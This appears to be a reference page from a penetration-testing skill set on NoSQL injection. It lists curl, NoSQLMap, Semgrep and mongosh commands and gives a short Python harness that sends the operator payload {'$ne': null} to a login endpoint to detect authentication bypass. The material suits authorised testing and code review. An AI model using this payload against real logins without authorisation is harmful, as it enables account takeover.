# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`nosql-injection`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -i -H 'Content-Type: application/json' -X POST 'https://target.example/login' -d '{"username":"realuser","password":"wrongpass"}'` | Capture the scalar-password baseline before sending an operator object | Cross-platform |
| `NoSQLMap` | `nosqlmap --attack 2 --target https://target.example/login` | Confirm operator-injection reachability with its least intrusive boolean checks | Linux |
| `Semgrep` | `semgrep -e 'User.findOne({password: $P})' --lang javascript .` | Find login filters that place a request field directly into a document query | Cross-platform |
| `mongosh` | `mongosh --eval 'db.users.find({password:{$ne:null}}).count()'` | Measure the document-count differential operator forms produce against a tester dataset | Linux, macOS, Windows |

## Minimal Script Shape

A scalar-versus-operator harness for a JSON login: it posts a wrong scalar password and then an operator object, flagging operator injection only when the operator form diverges from the scalar baseline.

```python
import json
import urllib.request

ENDPOINT = "https://target.example/login"

def post(body):
    data = json.dumps(body).encode()
    req = urllib.request.Request(ENDPOINT, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "authorised-assessment")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, len(r.read())
    except urllib.error.HTTPError as exc:
        return exc.code, 0

scalar = post({"username": "realuser", "password": "wrongpass"})
operator = post({"username": "realuser", "password": {"$ne": None}})
print({"scalar": scalar, "operator": operator,
       "operator_injection_suspected": operator != scalar and operator[0] == 200})
```
